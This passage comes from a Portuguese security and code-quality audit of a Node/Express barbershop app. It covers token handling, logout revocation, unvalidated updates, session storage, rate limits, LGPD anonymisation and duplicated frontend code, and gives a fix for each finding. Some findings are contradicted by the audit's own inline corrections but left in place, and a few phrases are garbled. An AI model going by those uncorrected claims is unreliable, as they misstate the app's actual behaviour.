  const trusted = process.env.TRUSTED_PROXY_RANGE;   // ex.: "10.0.0.0/8"
  if (!trusted) return false;
  return ip === undefined ? false : trusted.includes(ip);
});
```

E **atualize as dependências** (`npm audit fix`), fixando a versão com patch.

---

### [P1-03] 🟠 10 chamadas de `fetch` cru ignoram o auto-refresh → logout ao expirar

**Arquivos:** `public/client/home.html:591-593` · `client/request.html:451-455` · `client/profile.html:564-566,602-606` · `public/staff/agenda.html:779-781` · `staff/clients.html:362-364` · `staff/venda.html:528-530` · `staff/produtos.html:504-506` · `staff/finance.html:511-513`

```js
// client/home.html:577 & 591
const token = sessionStorage.getItem("accessToken");
const res = await fetch(`/api/appointments`, {
  headers: { "Authorization": `Bearer ${token}` }
});
```

Três consequências:
1. **Sem auto-refresh.** Quando o access token expira (15 min), essas chamadas recebem `401` e cada página faz:
   ```js
   if (res.status === 401) { window.location.href = "../pages/login.html"; return; }
   ```
   → **o usuário é expulso para o login mesmo com refresh token válido.**
2. **O token é capturado uma vez** no `DOMContentLoaded` e **nunca relido**. Se outra parte renovar o token, estas closures continuam enviando o **token velho** pelo resto da vida da página.
3. **`staff/agenda.html:783` redireciona para o lugar errado:**
   ```js
   if (res.status === 401) { window.location.href = "login.html"; return; }
   ```
   `agenda.html` está em `/staff/`, então `"login.html"` resolve para **`/staff/login.html` → 404**. Toda outra página usa `"../pages/login.html"` corretamente. Um token expirado na agenda produz uma **página branca 404**, não um redirect para o login.

**Correção — roteie tudo pelo helper:**

```js
// client/home.html
const response = await authenticatedFetch("/api/appointments");
if (!response) return;                       // shared.js já redirecionou para o login
if (!response.ok) throw new Error("Erro ao carregar agendamentos");
const allAppointments = await response.json();
```

E corrija `agenda.html:783` → `"../pages/login.html"`.

---

### [P1-04] 🟡 Logout do cliente: `onclick` inline conflita com o listener (latente)

> **🔎 Correção da revisão:** as 4 páginas do cliente carregam `client-app.js`, que liga o logout correto (`logout()` → modal → `POST /auth/logout` → blacklist). Com a CSP ativa o `onclick` inline é **bloqueado**, então hoje o servidor **é** avisado e o modal aparece (testado: logout 200 e token 401 depois). O problema descrito abaixo só ocorre se a CSP for afrouxada: aí o `onclick` limpa o `sessionStorage` e navega antes de revogar. Remover o `onclick` continua recomendado. Os pontos 1–3 abaixo descrevem esse cenário latente.

**Arquivos:** `public/client/home.html:451`, `client/request.html:337`, `client/profile.html:397`, `client/settings.html:367` (idênticos) + `public/js/client/client-app.js:27`

```html
<button class="client-logout-btn logout" type="button"
        onclick="sessionStorage.clear(); window.location.href='/pages/login.html';">
```

**Três problemas ao mesmo tempo:**
1. **O servidor nunca é avisado.** `sessionStorage.clear()` limpa a cópia do cliente, mas `server.js:26` mantém `activeSessions` e o refresh token rotacionado **vivos por 7 dias**. O refresh token continua sendo uma credencial válida — só mudou de dono.
2. **O modal de confirmação é contornado.** `shared.js:207-230` implementa `performLogout()` que corretamente chama `POST /auth/logout`. Os botões do cliente **nunca chegam lá**. Ou seja: área do staff tem logout com revogação + confirmação; área do cliente tem limpeza local e **nenhuma confirmação**.
3. **O `onclick` e o `addEventListener` disparam juntos.** `client-app.js:17` seleciona `.logout, .client-logout-btn` — o mesmo botão casa com ambos os seletores e ainda tem o `onclick` inline. Duas implementações de logout em corrida, e a errada vence.

**Correção:**

```html
<button class="client-logout-btn logout" type="button">
  <i class="bx bx-log-out"></i><span>Sair da conta</span>
</button>
```

```js
// client-app.js
logoutButtons.forEach((button) => {
  button.addEventListener("click", async (e) => {
    e.preventDefault();
    await logout();          // → modal → performLogout() → POST /auth/logout → clearSession()
  });
});
```

E em `shared.js:213`, **verifique a resposta** do servidor:

```js
const res = await fetch("/auth/logout", { method: "POST", headers: { Authorization: `Bearer ${accessToken}` } });
if (!res.ok) console.warn("[Logout] Servidor não revogou a sessão", res.status);
```

---

### [P1-05] 🟠 `PUT /api/products/:id` é um *upsert* destrutivo sem validação

**Arquivo:** `features/produtos-mysql/products-routes.js:91-109`

```js
router.put("/:id", authenticate(), async (req, res) => {
  const id = Number(req.params.id);
  const { name, description, cost_price, sale_price, stock, min_stock, category } = req.body;

  await pool.query(
    `UPDATE products SET name = ?, description = ?, cost_price = ?, sale_price = ?, stock = ?, min_stock = ?, category = ? WHERE id = ?`,
    [name, description, cost_price, sale_price, stock, min_stock, category, id]
  );
```

Três defeitos no mesmo handler:
1. **Sobrescrita total.** Se o front manda só `{ name }`, todos os outros campos viram `NULL`/`''` — inclusive `sale_price` e `stock`. Um `PATCH` sem querer apaga o preço de um produto.
2. **Zero validação.** `sale_price = -500`, `stock = -3`, `name = ""` são aceitos. Compare com `POST`, que pelo menos valida presença.
3. **`id` não validado (🔎 parcial).** O handler usa `req.params.id` como string; um id inválido não casa nenhuma linha e a API devolve **404** (não `200` com `null`). Falta apenas o `400` explícito para id não inteiro. Os itens 1 e 2 são reais.

**Correção:**

```js
router.put("/:id", authenticate(STAFF_ROLES), async (req, res) => {
  const id = Number(req.params.id);
  if (!Number.isInteger(id) || id <= 0) {
    return res.status(400).json({ error: "Identificador inválido." });
  }

  const FIELDS = {
    name: (v) => (typeof v === "string" && v.trim().length >= 2 && v.trim().length <= 100 ? v.trim() : null),
    sale_price: (v) => (Number.isFinite(Number(v)) && Number(v) >= 0 ? Number(v) : null),
    cost_price: (v) => (Number.isFinite(Number(v)) && Number(v) >= 0 ? Number(v) : null),
    stock: (v) => (Number.isInteger(Number(v)) && Number(v) >= 0 ? Number(v) : null),
    min_stock: (v) => (Number.isInteger(Number(v)) && Number(v) >= 0 ? Number(v) : null),
    category: (v) => (typeof v === "string" && v.trim().length <= 60 ? v.trim() : null),
  };

  const updates = {};
  for (const [key, validate] of Object.entries(FIELDS)) {
    if (req.body[key] === undefined) continue;          // PATCH: só o que veio
    const value = validate(req.body[key]);
    if (value === null) return res.status(400).json({ error: `Campo inválido: ${key}.` });
    updates[key] = value;
  }
  if (Object.keys(updates).length === 0) {
    return res.status(400).json({ error: "Nenhum campo para atualizar." });
  }

  const sets = Object.keys(updates).map((k) => `${k} = ?`).join(", ");
  await pool.query(`UPDATE products SET ${sets} WHERE id = ?`, [...Object.values(updates), id]);
  // ...
});
```

O mesmo *upsert* destrutivo vale para `finance` e `sales`. Extraia um helper `buildUpdate(body, schema)` compartilhado — ver §5.2.

---

### [P1-06] 🟠 Concorrência: `double-booking` sem *unique constraint* no banco

> **🔎 Correção da revisão:** existe `idx_appointment_date`, então o `SELECT ... FOR UPDATE` **não** faz varredura completa da tabela; ele trava o intervalo daquela data. O que falta de fato é a unique constraint e a chave estável (`staff_id`; ver X-08). A afirmação sobre degradação por varredura completa foi retirada.

**Arquivos:** `features/agenda-mysql/appointments-routes.js:114-132` · `features/agenda-mysql/schema.sql`

O `FOR UPDATE` no `SELECT` de conflito existe e está dentro de uma transação — bom. Mas o schema **não tem índice composto nem *constraint* única**:

```sql
-- features/agenda-mysql/schema.sql
CREATE TABLE IF NOT EXISTS appointments (
  ...
  INDEX idx_appointment_date (appointment_date),
  INDEX idx_appointment_status (status)
);   -- ← NÃO EXISTE idx_staff_datetime nem UNIQUE
```

Sem índice, o `SELECT ... FOR UPDATE` faz **varredura completa da tabela** e trava todas as linhas que encontra — o que serializa todos os agendamentos concorrentes (e degrada conforme a agenda cresce), mas **não garante unicidade**.

**Correção — a garantia tem de ser o banco:**

```sql
ALTER TABLE appointments
  ADD INDEX idx_staff_datetime (staff_name, appointment_date, appointment_time);

-- Slots cancelados liberam o horário: use coluna gerada para o índice único:
ALTER TABLE appointments
  ADD COLUMN active_slot VARCHAR(80)
    GENERATED ALWAYS AS (
      IF(status = 'cancelado', NULL, CONCAT(staff_name, '|', appointment_date, '|', appointment_time))
    ) STORED,
  ADD UNIQUE KEY uq_active_slot (active_slot);
```

Com isso, o `INSERT` concorrente falha com `ER_DUP_ENTRY`:

```js
catch (error) {
  if (error.code === "ER_DUP_ENTRY") {
    return res.status(409).json({ error: "Este horário já foi reservado." });
  }
  ...
}
```

---

### [P1-07] 🟠 LGPD: anonimização incompleta — nome e telefone ficam em 3 tabelas

**Arquivo:** `features/clientes-mysql/clients-routes.js:236-239`

```js
await pool.query(
  `UPDATE clients SET name = 'Usuário Anonimizado', email = ?, phone = '00000000000',
     cpf = NULL, birthdate = NULL, skin_notes = NULL, active = 0 WHERE id = ?`,
  [anonymousEmail, clientId]
);
```

A tabela `clients` é anonimizada. Mas o mesmo `DELETE /api/clients/me` **não toca** em:

| Tabela | Colunas com PII do cliente | Efeito |
|---|---|---|
| `appointments` | `client_name`, `client_phone` | Nome e telefone do titular permanecem linked ao histórico. |
| `sales` | `client_name` | Nome do cliente permanece nos registros de venda. |
| `transactions` | descrição livre (ex.: `"Venda: João Silva"`) | Nome embutido no texto da descrição. |

Além disso, `fav_barber`, `hair_style` e `beard_style` **não** são anonimizados (ficam com dados de perfil do titular), e a `password_hash` permanece.

**Correção (ver §6.5 para a versão completa com transação):**

```js
await pool.query(
  `UPDATE clients
     SET name = 'Usuário Anonimizado', email = ?, phone = NULL,
         cpf = NULL, birthdate = NULL, skin_notes = NULL,
         fav_barber = NULL, hair_style = NULL, beard_style = NULL,
         password_hash = ?, active = 0
   WHERE id = ?`,
  [anonymousEmail, await bcrypt.hash(crypto.randomUUID(), 10), clientId]
);
```

---

### [P1-08] 🟠 Estado de sessão e blacklist em memória — não escala e não sobrevive a restart

**Arquivo:** `server.js:26-28`

```js
const activeSessions = new Map();   // userId -> { refreshToken, createdAt, lastUsed }
const tokenBlacklist = new Set();   // tokens invalidados
const failedLogins = new Map();     // identity -> { count, lockedUntil }
```

Três consequências:
1. **Restart = logout de todo mundo.** O JWT continua válido até expirar, mas `authenticate()` recusa porque `activeSessions.get(userId)` é `undefined` (mensagem: *"Sessão não encontrada ou expirada"*).
2. **Restart = blacklist perdida.** Tokens de logout voltam a valer.
3. **Horizontal não escala.** Duas instâncias → `userId` autenticado na instância A é rejeitado na instância B.

**Correção (escolha uma):**

```js
// Opção A — Redis (recomendado para multi-instância)
const redis = require("redis");
const client = await redis.connect({ url: process.env.REDIS_URL });
await client.set(`sess:${userId}`, JSON.stringify(session), { EX: 7 * 24 * 3600 });
await client.set(`blk:${jti}`, "1", { EX: 900 });
```

```js
// Opção B — MySQL (sem infraestrutura nova)
CREATE TABLE active_sessions (
  user_id VARCHAR(64) PRIMARY KEY,
  refresh_jti CHAR(32) NOT NULL,
  role ENUM('client','staff','admin') NOT NULL,
  identity VARCHAR(150) NOT NULL,
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  last_used  TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  INDEX idx_sessions_last_used (last_used)
);
```

---

### [P1-09] 🟠 `JWT_REFRESH_SECRET` tem fallback silencioso

**Arquivo:** `server.js:15`

```js
const JWT_SECRET = process.env.JWT_SECRET;
const JWT_REFRESH_SECRET = process.env.JWT_REFRESH_SECRET || JWT_SECRET + "_refresh";
```

O `JWT_SECRET` é validado (≥32 chars, `server.js:19-21`), mas o `JWT_REFRESH_SECRET` **não**. A derivação por sufixo reduz o espaço efetivo de entropia e — pior — se alguém reconfigurar só o `JWT_SECRET` em produção, os refresh tokens antigos continuam válidos.

**Correção:**

```js
const JWT_SECRET = process.env.JWT_SECRET;
const JWT_REFRESH_SECRET = process.env.JWT_REFRESH_SECRET;

for (const [name, value] of [["JWT_SECRET", JWT_SECRET], ["JWT_REFRESH_SECRET", JWT_REFRESH_SECRET]]) {
  if (!value || value.length < 32) {
    throw new Error(`${name} ausente ou fraco no arquivo .env (mínimo 32 caracteres).`);
  }
}
if (JWT_SECRET === JWT_REFRESH_SECRET) {
  throw new Error("JWT_SECRET e JWT_REFRESH_SECRET devem ser diferentes.");
}
```

---

### [P1-10] 🟡 Rate limit só no login; rotas de dados e `/auth/refresh` desprotegidos

**Arquivo:** `server.js:68-76` (só em `/auth/login/*`)

| Rota | Risco |
|---|---|
| `POST /api/register` | tem limite (20/15min) ✅ |
| `POST /api/finance` / `POST /api/sales` | um `client` pode criar milhares de lançamentos (ver P0-01) |
| `POST /api/appointments` | criação em massa de agendamentos |
| `POST /auth/refresh` | **sem limite** — gera JWT novo a cada chamada; martelando o endpoint seBurla |

```
$ (15 tentativas de loginfollowed)
→ 429 {"error":"Muitas tentativas. Tente novamente em 15 minutos."}   ✅ funciona
```

```js
const refreshLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 60,
  standardHeaders: true,
  legacyHeaders: false,
});
app.post("/auth/refresh", refreshLimiter, (req, res) => { ... });

const apiLimiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 300, standardHeaders: true, legacyHeaders: false });
app.use("/api/", apiLimiter);
```

---

### [P1-11] 🟡 Enumeração de usuários no *fallback* de `.env` + log de PII

**Arquivo:** `server.js:399-432`

O login unificado tenta: `client` (MySQL) → `staff` (MySQL) → `.env`. Para identidade inexistente, a resposta é `401 Usuário ou senha incorretos.` — correto. Mas o log registra a identidade tentada:

```js
console.warn(`Falha de login unificado para: ${identity}`);
```

E as credenciais de `.env` (`CLIENT_LOGIN`, `STAFF_LOGIN`, `ADMIN_LOGIN`) existem como **fallback permanente** — em produção, um backdoor com senha em variável de ambiente.

```js
console.warn(JSON.stringify({ event: "login_failed", ip: req.ip, at: new Date().toISOString() }));
```

---

### [P1-12] 🟡 `checkLockout` por identidade permite DoS de login

**Arquivo:** `server.js:28-59`

O lockout é por `identity`. Um atacante pode **lockar** a conta de uma vítima (DoS de login) com 5 tentativas. Combine identidade + IP:

```js
function checkLockout(identity, ip) {
  return isLocked(`id:${identity}`) || isLocked(`ip:${ip}`);
}
```

---

### [P1-13] 🟢 O que está bem feito em segurança

Vale registrar:

- **Prepared statements em 100% das queries** — nenhuma concatenação de input em SQL.
- **Hash falso contra *timing attack*** (`DUMMY_HASH` em `client-auth.js` e `staff-auth.js`).
- **Prevenção de enumeração de usuário no cadastro**: `ER_DUP_ENTRY` e "e-mail já cadastrado" retornam `201` genérico.
- **Refresh token rotation** com `jti` único e comparação estrita com a sessão (`server.js:468`).
- **Blacklist de token no logout** + remoção da sessão.
- **Transações ACID presentes** em vendas e agenda, com `ROLLBACK` no `catch`.
- **`escapeHtml` presente e aplicado** na maioria dos sinks (falta unificar e escapar aspas).
- **Validação de `bcrypt` com 72 bytes** (recusa em vez de truncar silenciosamente).
- **Zero `eval` / `new Function` / `document.write` / `insertAdjacentHTML` / `outerHTML`** em todo o frontend — raro num projeto vanilla de 23 páginas.
- **Query param tratado como whitelist + `textContent`** (`auth-manager.js:220-226`) — padrão exemplar.
- **`server.js:61` `app.disable("x-powered-by")`** ✅
- **CORS ausente** → o navegador bloqueia cross-origin por padrão ✅
- **`Content-Security-Policy` presente e restritiva** (apesar de quebrar o app — ver P0-02) ✅
- **`JSON Web Token` com `issuer`/`audience`/`type` verificados** ✅

---

## 🧱 4. P2 — Integridade de dados

### [P2-01] 🟠 `ensureTable()` roda DDL a cada requisição

> **🔎 Correção da revisão:** vale só para `appointments`, `finance`, `products` e `sales`. `staff-table.js`, `clients-routes.js` e `services-routes.js` já memoizam (`tableReady`/`columnsReady`).

**Arquivos:** todos os `*-routes.js` e `staff-table.js`

```js
router.get("/", authenticate(), async (req, res) => {
  await ensureStaffTable(getPool);   // ← CREATE TABLE IF NOT EXISTS em CADA GET
```

Isso segura um **metadata lock** no schema a cada request, polui o binlog, é caro em MySQL gerenciado (PlanetScale, Aurora Serverless v2) e **esconde migrações de verdade**.

**Correção:** rode as migrações **no boot**:

```js
// server.js
const { runMigrations } = require("./features/cadastro-mysql/db");
runMigrations()
  .then(() => app.listen(PORT, () => console.log(`Servidor em http://localhost:${PORT}`)))
  .catch((error) => { console.error("Falha nas migrações:", error); process.exit(1); });
```

E versione as migrações em `schema_migrations` (`001_init.sql`, `002_client_lgpd.sql`, …).

### [P2-02] 🟠 Vendas: baixa de estoque por nome — frágil

> **🔎 Correção da revisão:** o trecho SQL abaixo está impreciso; o código real é `SELECT id, stock FROM products WHERE name = ? AND active = 1 LIMIT 1 FOR UPDATE` seguido de `stock = GREATEST(0, stock - 1)`. O problema (casar por nome, sempre abater 1 unidade) é real.

**Arquivo:** `features/vendas-mysql/sales-routes.js`

```sql
SELECT id, name, price FROM products WHERE name = ? LIMIT 1
```

A venda casa o produto pelo **nome**. Dois produtos com o mesmo nome ("Shampoo") → o estoque abatido é sempre o primeiro. E se o nome mudar no cadastro, o estoque deixa de ser abatido **sem erro**.

**Correção:** venda deve referenciar `product_id`.

```sql
ALTER TABLE sales ADD COLUMN product_id INT NULL;
```

### [P2-03] 🟠 Estoque negativo e preço negativo são aceitos

`POST /api/products` valida presença, mas **não** faixa:

```js
if (typeof name !== "string" || !name.trim() || name.length > 100) return ...;
if (typeof price !== "number" || !Number.isFinite(price) || price < 0) return ...;  // ← ADICIONE
if (!Number.isInteger(stock) || stock < 0) return ...;                              // ← ADICIONE
if (!Number.isInteger(min_stock) || min_stock < 0) return ...;                     // ← ADICIONE
```

### [P2-04] 🟠 `Decimal` money vira `float` no JavaScript

**Arquivos:** `finance-routes.js`, `sales-routes.js`

`DECIMAL(10,2)` no MySQL é retornado como **string** pelo `mysql2` (por padrão) ou como `number` (com `decimalNumbers: true`). O JS não tem `Decimal`. Somar valores monetários em `float` acumula erro de arredondamento — e isso é o **caixa da barbearia**.

```js
// db.js
pool = mysql.createPool({ ..., decimalNumbers: true });

const toCents = (value) => Math.round(Number(value) * 100);
const fromCents = (cents) => (cents / 100).toFixed(2);
```

### [P2-05] 🟡 `console.log` de dados de sessão em produção

**Arquivos:** `public/js/core/shared.js:183,236,239` · `public/js/staff/staff-app.js:59,137,140,143` · `public/js/client/client-app.js:14,18,23`

```js
console.log("[Logout] Botões do modal devem ser configurados automaticamente em createLogoutModal");
console.log("[Staff App] Configurando handler para botão de logout:", button);
```

O terceiro é puro ruído. Em produção, `console.log` também vaza informação (tokens em requisições) e polui o console do suporte. Remova e deixe só `console.error` para o que é realmente erro.

### [P2-06] 🟠 `alert()` como feedback de produto — **e a mentira do "sucesso"**

**Arquivo:** `public/js/staff/staff-app.js:676-692`

```js
async function handleProductSubmit(e) {
  e.preventDefault();
  alert("Produto cadastrado com sucesso! (Funcionalidade em desenvolvimento)");
  e.target.reset();
}
async function handleSaleSubmit(e) { ... alert("Venda registrada com sucesso! (Funcionalidade em desenvolvimento)"); ... }
async function handleAppointmentSubmit(e) { ... alert("Agendamento criado com sucesso! (Funcionalidade em desenvolvimento)"); ... }
```

**Pior que um botão desabilitado:** o usuário clica "Cadastrar produto", o sistema mostra um `alert()` de sucesso, e **nada é salvo** — o usuário acredita que gravou.

**E o conflito com os handlers reais:** `staff-app.js:238` anexa `handleProductSubmit` ao `#product-form`, enquanto `staff/produtos.html:587` anexa um handler **real** ao **mesmo** `#product-form`. Ambos disparam no submit → o usuário recebe o `alert()` de "Funcionalidade em desenvolvimento" **e** o POST real, e o stub ainda chama `e.target.reset()`, **limpando o formulário do usuário** enquanto a requisição real ainda está em voo. Idêntico para `#sale-form` (`staff-app.js:244` vs `venda.html:606`) e `#appointment-form` (`staff-app.js:250` vs `agenda.html:905`).

**Correção:** delete `staff-app.js:676-692` e as reanexações (`:236-251`).

### [P2-07] 🟡 Dashboard, relatórios e avaliações são **100% dados falsos**

**Arquivos:** `public/staff/dashboard.html:474-533` (KPIs), `:606-624` (próximos agendamentos) · `public/staff/relatorios.html:154-208` (gráfico), `:250-282` (ranking) · `public/staff/avaliacoes.html:152-250` · `public/client/home.html:462-546` · `public/client/profile.html:493-501` · `public/client/request.html:360-448`

```html
<!-- staff/dashboard.html — nenhum desses números vem da API -->
<small>Atendimentos Hoje</small><strong>18</strong>
<small>Faturamento Hoje</small><strong>R$ 1.840</strong>
<small>Agendamentos</small><strong>24</strong>
<small>Ticket Médio</small><strong>R$ 76,60</strong>
```

```js
// client/request.html:448 — TODO agendamento nasce com o mesmo telefone:
const client_phone = "(62) 99999-9999";
```

```html
<!-- client/profile.html — fidelidade e cupom fixos -->
<b>Status: Cliente VIP Ouro</b> · <b>12 pts</b> · <b>BARBER15OFF — 15% de desconto</b>
```

E `loyalty_points` tem `DEFAULT 12` no banco (`clients-routes.js:23`) com **nenhuma regra de cálculo** em lugar nenhum do repositório. Um número mágico que decide elegibilidade a desconto (`BARBER15OFF`) — e que, por ser decisão automatizada com efeito sobre o titular, exige transparência do **art. 20 da LGPD**.

**Impacto:** o dono da barbearia toma decisão de contratação olhando "R$ 1.840 faturamento hoje", que é uma string hardcoded.

**Correção:** ou (a) ligue à API, ou (b) — se forem placeholders — marque de forma inequívoca:

```html
<span class="badge badge-example">Dados de exemplo</span>
```

**(b) é uma correção de 10 minutos e deve entrar hoje.**

### [P2-08] 🟡 Toda rota de dados devolve `500` genérico quando o MySQL cai

**Confirmado em runtime.** Com o banco fora do ar, `GET /api/finance` devolve:

```json
{"error":"Erro interno ao listar transações financeiras."}
```

O usuário não sabe se é falha de rede, senha errada ou manutenção. E o *log* vaza stack trace completo (`Erro ao autenticar equipe no MySQL: Error: connect ECONNREFUSED 127.0.0.1:3306 ...`).

```js
app.use((err, req, res, next) => {
  const isDbDown = err.code === "ECONNREFUSED" || err.code === "ER_ACCESS_DENIED_ERROR";
  if (isDbDown) {
    req.log?.error({ err }, "banco indisponível");
    return res.status(503).json({
      error: "O sistema está temporariamente indisponível. Tente em alguns instantes.",
      code: "SERVICE_UNAVAILABLE",
    });
  }
  req.log?.error({ err }, "erro interno");
  res.status(500).json({ error: "Erro interno do servidor." });
});
```

---

## 💻 5. P3 — Código, modernização e arquitetura

### [P3-01] 🟠 Duas implementações da página de clientes brigam pelo mesmo DOM

**Arquivos:** `public/staff/clients.html:349-449` (inline) **e** `public/js/staff/staff-app.js:258-308`

| | `clients.html` inline | `staff-app.js` | `clients-page.js` |
|---|---|---|---|
| Carregado? | ✅ | ✅ (dispara sozinho) | ❌ **nunca carregado** |
| Alvo do render | `#clients-tbody` | `#clients-tbody` | `#clients-body` (id diferente!) |
| Colunas emitidas | 6 (com `createdAt`) | **5** (sem `createdAt`) | 5 + `createdAt` |
| `colspan` do vazio | `6` | **`5`** | `5` |
| Escaping | `escapeHtml` (inseguro p/ aspas) | `escapeHtml` (inseguro p/ aspas) | ✅ `textContent` |
| Inativar/Reativar | ✅ | ❌ (só "Ver detalhes" → `alert()`) | ✅ |

`staff-app.js:210-211` dispara `loadClients()` porque `currentPage === 'clients.html'`, e o `<tbody>` da página **é o mesmo**. Resultado: **2 requisições** a cada visita, e a tabela perde a coluna "Cadastro" e desalinha as colunas, dependendo de qual render vencer a corrida.

**Correção:** adote `clients-page.js` (o único com DOM-building correto, escaping correto, coluna `createdAt` e fluxo inativar/reativar) e delete o bloco inline e o duplicado.

### [P3-02] 🟠 13 sidebars duplicados (~650 linhas)

**Arquivos:** `staff/{agenda,clients,dashboard,finance,produtos,venda,services,barbeiros,avaliacoes,relatorios,configuracoes,novocliente,novagendamento}.html`

Cada um tem ~50 linhas de markup idêntico (12 links + marca + logout). Adicionar um item de menu = 13 edições — e **já divergiram**: `barbeiros.html` e `services.html` têm `aria-label="Navegação principal"` no `<nav>`; os outros 11, não.

**Correção:** extraia para `public/partials/sidebar.html` + `renderSidebar()` no `shared.js`, ou adote Web Components (§5.6).

### [P3-03] 🟠 ~1.300 linhas de CSS duplicado nas 4 páginas de cliente

**Arquivos:** `public/client/home.html` (398 linhas de `<style>` inline), `profile.html` (344), `settings.html` (314), `request.html` (284)

O diff entre `home.html` e `request.html` é de **244 linhas**; entre `home.html` e `profile.html`, **273**. São quase-cópias que **já divergiram**.

**Correção:** extrair para `public/styles-client.css` — uma alteração de cor em 1 lugar em vez de 4.

### [P3-04] 🟠 Poluição do namespace global (13–17 `window.*`)

> **🔎 Correção da revisão:** o "conflito de `showMessage`" não procede: `auth-manager.js` está dentro de IIFE, logo só `register.js` vaza globais (e as duas páginas nunca são carregadas juntas). Os `window.*` de `shared.js` e das páginas são reais.

| # | Arquivo:linha | Global |
|---|---|---|
| 1-8 | `public/js/core/shared.js:257-266` | `getSession`, `clearSession`, `clearSessionAndRedirect`, `refreshAccessToken`, `authenticatedFetch`, `requireAuth`, `logout` |
| 9 | `public/js/core/shared.js:246-254` | `BarberSelect` (o padrão **certo**, e **nenhuma página usa**) |
| 10-17 | `staff-app.js:705`, `agenda.html:851,872`, `clients.html:424`, `venda.html:589`, `produtos.html:570`, `finance.html:594` | `viewClient`, `updateStatus`, `deleteAppointment`, `toggleClientStatus`, `deleteSale`, `deleteProduct`, `deleteTransaction` |

E `public/js/register.js` **não tem wrapper IIFE** (ao contrário de `shared.js:4` e `auth-manager.js:4`), vazando `registerForm`, `registerMessage`, `togglePassword`, `passwordInput`, `showMessage`, `hideMessage`, `isValidEmail`, `isValidPhone` — **8 globais**.

**A bomba-relógio:** `register.js:33` define um `showMessage(text, type)` global; `auth-manager.js:64` define **outro** `showMessage(text, type)` global, com implementação diferente. Carregue as duas páginas no mesmo documento e a última vence — quebra silenciosa.

**Correção:** mantenha apenas `window.BarberSelect`; embrulhe `register.js` em IIFE; converta os `onclick` em `data-action` + delegação.

### [P3-05] 🟠 Zero testes, zero lint, zero CI

```
$ cat package.json
"scripts": { "start": "node server.js", "dev": "node --watch server.js" }
"devDependencies": (nenhum)
$ ls .github
(não existe)
```

```json
{
  "scripts": {
    "start": "node server.js",
    "dev": "node --watch server.js",
    "test": "node --test test/**/*.test.js",
    "lint": "eslint .",
    "format": "prettier --write .",
    "check": "npm run lint && npm test"
  },
  "devDependencies": { "eslint": "^9.0.0", "prettier": "^3.3.0", "supertest": "^7.0.0" }
}
```

Use o **runner nativo do Node** (`node --test`) — zero dependência extra para começar. O primeiro teste que paga o custo:

```js
// test/auth.test.js
import { test } from "node:test";
import assert from "node:assert/strict";
import request from "supertest";
import { createApp } from "../server.js";   // ← exporte o app, não só o listen

test("cliente não acessa o financeiro", async () => {
  const app = createApp();
  const token = await loginAs(app, "client");
  const res = await request(app).get("/api/finance").set("Authorization", `Bearer ${token}`);
  assert.equal(res.status, 403);   // ← hoje devolve 500/200
});
```

> Requer refatorar `server.js` para `module.exports = app` + `if (require.main === module) app.listen(...)`. É a mudança #1 do §5.6.

### [P3-06] 🟠 Validação duplicada e inconsistente entre módulos

- `features/cadastro-mysql/client-auth.js` → `parseRegisterBody` (senha ≥ **6**)
- `features/cadastro-mysql/staff-auth.js` → `parseCreateBody` (senha ≥ **8**)

Um cliente pode ter senha de 6 caracteres, um colaborador precisa de 8. Sem justificativa registrada.

**Correção — camada única:**

```js
// features/shared/validation.js
const RULES = {
  password: { min: 8, max: 72, bytes: true, label: "senha" },
  email:    { pattern: /^[^\s@]+@[^\s@]+\.[^\s@]+$/, max: 150, label: "e-mail" },
  phoneBR:  { digits: [10, 11], max: 20, label: "telefone" },
  name:     { min: 3, max: 100, label: "nome" },
};

function validate(schema, body) {
  const clean = {}; const errors = [];
  for (const [field, rule] of Object.entries(schema)) {
    const value = body[field];
    if (value === undefined || value === null || value === "") {
      errors.push({ field, message: `Informe ${rule.label}.` }); continue;
    }
    const result = applyRule(rule, value);
    if (result.error) errors.push({ field, message: result.error });
    else clean[field] = result.value;
  }
  return errors.length ? { errors } : { value: clean };
}
```

### [P3-07] 🟡 Duplicação do login nos dois caminhos

`client-auth.js:150-190` e `staff-auth.js:59-115` repetem: extrair identidade, normalizar e-mail, `bcrypt.compare` com hash falso, gerar tokens, registrar sessão, responder JSON. Duas cópias que já divergiram (o `client` usa `identity.trim()`, o `staff` usa `normalizedLogin`).

```js
// features/shared/session.js
function issueSession({ role, identity, userId, createAccessToken, createRefreshToken, activeSessions }) {
  const accessToken = createAccessToken(userId, role, identity);
  const refreshToken = createRefreshToken(userId, role, identity);
  activeSessions.set(userId, { refreshToken, createdAt: Date.now(), lastUsed: Date.now(), identity, role });
  return { accessToken, refreshToken, role, userId, identity, expiresIn: 900 };
}
```

### [P3-08] 🟡 `handleLogin` do `.env` compara senha em texto puro

**Arquivo:** `server.js:273`

```js
if (identity !== expectedLogin || password !== expectedPassword) { ... }
```

```js
const a = Buffer.from(expectedPassword.padEnd(64).slice(0, 64));
const b = Buffer.from(password.padEnd(64).slice(0, 64));
if (!crypto.timingSafeEqual(a, b) || identity !== expectedLogin) { ... }
```

### [P3-09] 🟡 `express.static` antes das rotas — *shadowing* de API

> **🔎 Correção da revisão:** a alegação de que `express.static` serviria arquivos tipo `.env` está incorreta: o padrão do Express ignora dotfiles. O *shadowing* de rotas de API por arquivos em `public/` continua teoricamente possível, mas é de baixo impacto.

**Arquivo:** `server.js:78`

```js
app.use(express.static(PUBLIC_DIR));
```

Se alguém criar `public/api/health`, a rota estática vence a API silenciosamente. E `express.static` serve arquivos `.env`-like se existirem dentro de `public/`.

```js
app.use(express.static(PUBLIC_DIR, {
  dotfiles: "deny",
  index: "index.html",
  maxAge: "1h",
}));
```
— **movido para o fim** do stack de rotas.

### [P3-10] 🟡 Sem `debounce` na busca — uma query por tecla digitada

| Arquivo:linha | Listener | Efeito |
|---|---|---|
| `staff/agenda.html:894` | `input` → `loadAppointments` | 🔴 `GET /api/appointments` **a cada tecla** |
| `staff/venda.html:647` | `input` → `loadSales` | 🔴 idem |
| `staff/produtos.html:629` | `input` → `loadProducts` | 🔴 idem |
| `staff/finance.html:652` | `input` → `loadTransactions` | 🔴 idem |

```js
function debounce(fn, delay = 300) {
  let t;
  return (...args) => { clearTimeout(t); t = setTimeout(() => fn(...args), delay); };
}
searchInput.addEventListener("input", debounce(loadAppointments, 300));
```

### [P3-11] 🟡 Erros silenciosos e ausência de *loading states* em 8 telas

